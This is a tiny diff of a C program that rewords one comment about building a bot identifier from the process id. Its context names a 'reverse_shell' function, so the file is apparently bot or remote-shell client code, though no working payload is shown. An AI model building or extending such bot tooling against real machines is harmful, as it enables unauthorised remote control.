@@ -62,7 +62,7 @@ void reverse_shell(int sock) {
 }
 
 int main() {
-    // generate bot_id from process (ex: bot_1001)
+    // generate bot_id with process id (ex: bot_1001)
     char bot_id[20];
     sprintf(bot_id, "bot_%d", getpid());
 
